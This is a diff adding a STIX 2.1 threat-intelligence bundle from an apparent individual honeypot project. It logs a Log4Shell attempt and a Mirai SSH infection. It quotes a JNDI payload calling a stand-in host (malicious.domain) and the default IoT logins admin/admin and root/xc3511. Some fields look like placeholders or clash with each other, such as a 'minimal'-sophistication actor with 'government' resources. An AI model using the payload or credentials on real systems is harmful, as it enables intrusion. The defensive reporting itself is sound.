@@ -1,0 +1,153 @@
+{
+  "type": "bundle",
+  "id": "bundle--a1b2c3d4-0003-4e5f-8a9b-chandraverse03",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "identity",
+      "spec_version": "2.1",
+      "id": "identity--chandraverse-honeypot",
+      "name": "ChandraVerse Honeypot Research",
+      "identity_class": "individual",
+      "created": "2025-01-03T00:00:00.000Z",
+      "modified": "2025-01-03T00:00:00.000Z"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--http-exploit-001",
+      "name": "Web App Exploit Attempt — Log4Shell CVE-2021-44228",
+      "description": "IP submitted Log4Shell payload via HTTP POST to Glastopf web trap on port 80. Payload: ${jndi:ldap://malicious.domain/exploit}. Consistent with automated exploit toolkit fingerprint.",
+      "indicator_types": ["malicious-activity", "exploit"],
+      "pattern_type": "stix",
+      "pattern": "[ipv4-addr:value = '45.33.x.x']",
+      "valid_from": "2025-01-03T05:30:00.000Z",
+      "valid_until": "2025-01-31T23:59:00.000Z",
+      "labels": ["log4shell", "cve-2021-44228", "web-exploit", "jndi"],
+      "confidence": 95,
+      "created": "2025-01-03T05:30:00.000Z",
+      "modified": "2025-01-03T05:30:00.000Z",
+      "created_by_ref": "identity--chandraverse-honeypot"
+    },
+    {
+      "type": "indicator",
+      "spec_version": "2.1",
+      "id": "indicator--ssh-cowrie-mirai",
+      "name": "Mirai Botnet SSH Propagation — IoT Default Creds",
+      "description": "Cowrie SSH trap captured full Mirai botnet infection sequence: default credential login (admin/admin, root/xc3511), dropper download via wget, and bot registration to C2 over port 48101.",
+      "indicator_types": ["malicious-activity", "botnet"],
+      "pattern_type": "stix",
+      "pattern": "[ipv4-addr:value = '103.99.x.x']",
+      "valid_from": "2025-01-03T02:18:00.000Z",
+      "valid_until": "2025-01-31T23:59:00.000Z",
+      "labels": ["mirai", "botnet", "iot", "default-credentials", "c2"],
+      "confidence": 99,
+      "created": "2025-01-03T02:18:00.000Z",
+      "modified": "2025-01-03T02:18:00.000Z",
+      "created_by_ref": "identity--chandraverse-honeypot"
+    },
+    {
+      "type": "attack-pattern",
+      "spec_version": "2.1",
+      "id": "attack-pattern--T1078",
+      "name": "Valid Accounts",
+      "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1078",
+          "url": "https://attack.mitre.org/techniques/T1078"
+        }
+      ],
+      "created": "2025-01-03T00:00:00.000Z",
+      "modified": "2025-01-03T00:00:00.000Z"
+    },
+    {
+      "type": "attack-pattern",
+      "spec_version": "2.1",
+      "id": "attack-pattern--T1059",
+      "name": "Command and Scripting Interpreter",
+      "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1059",
+          "url": "https://attack.mitre.org/techniques/T1059"
+        }
+      ],
+      "created": "2025-01-03T00:00:00.000Z",
+      "modified": "2025-01-03T00:00:00.000Z"
+    },
+    {
+      "type": "malware",
+      "spec_version": "2.1",
+      "id": "malware--mirai-variant-arm",
+      "name": "Mirai.ARM Botnet Dropper",
+      "description": "ARM-compiled Mirai variant downloaded to Cowrie virtual filesystem. Targets embedded IoT devices. Binary signature matches Mirai.ARM family from VirusTotal community.",
+      "malware_types": ["botnet", "trojan"],
+      "is_family": false,
+      "hashes": {
+        "SHA-256": "5d41402abc4b2a76b9719d911017c592c8f2e72a33e2e5b4f9b3f01c8e9b7d3a"
+      },
+      "created": "2025-01-03T02:22:00.000Z",
+      "modified": "2025-01-03T02:22:00.000Z",
+      "created_by_ref": "identity--chandraverse-honeypot"
+    },
+    {
+      "type": "threat-actor",
+      "spec_version": "2.1",
+      "id": "threat-actor--mirai-botnet-cluster",
+      "name": "Mirai-IoT-Propagation-Cluster-01",
+      "description": "Automated Mirai botnet propagation cluster. Fully autonomous — no human operator interaction observed. Scans /0 for open SSH port 22 with default IoT credentials.",
+      "threat_actor_types": ["criminal"],
+      "sophistication": "minimal",
+      "resource_level": "government",
+      "primary_motivation": "organizational-gain",
+      "created": "2025-01-03T03:00:00.000Z",
+      "modified": "2025-01-03T03:00:00.000Z",
+      "created_by_ref": "identity--chandraverse-honeypot"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--mirai-ssh-to-T1078",
+      "relationship_type": "indicates",
+      "source_ref": "indicator--ssh-cowrie-mirai",
+      "target_ref": "attack-pattern--T1078",
+      "created": "2025-01-03T02:18:00.000Z",
+      "modified": "2025-01-03T02:18:00.000Z"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--mirai-ssh-to-T1059",
+      "relationship_type": "indicates",
+      "source_ref": "indicator--ssh-cowrie-mirai",
+      "target_ref": "attack-pattern--T1059",
+      "created": "2025-01-03T02:18:00.000Z",
+      "modified": "2025-01-03T02:18:00.000Z"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--mirai-actor-to-malware",
+      "relationship_type": "uses",
+      "source_ref": "threat-actor--mirai-botnet-cluster",
+      "target_ref": "malware--mirai-variant-arm",
+      "created": "2025-01-03T03:00:00.000Z",
+      "modified": "2025-01-03T03:00:00.000Z"
+    },
+    {
+      "type": "observed-data",
+      "spec_version": "2.1",
+      "id": "observed-data--day3-summary",
+      "first_observed": "2025-01-03T00:00:00.000Z",
+      "last_observed": "2025-01-03T23:59:59.000Z",
+      "number_observed": 19814,
+      "object_refs": ["indicator--http-exploit-001", "indicator--ssh-cowrie-mirai"],
+      "created": "2025-01-03T23:59:00.000Z",
+      "modified": "2025-01-03T23:59:00.000Z",
+      "created_by_ref": "identity--chandraverse-honeypot"
+    }
+  ]
+}
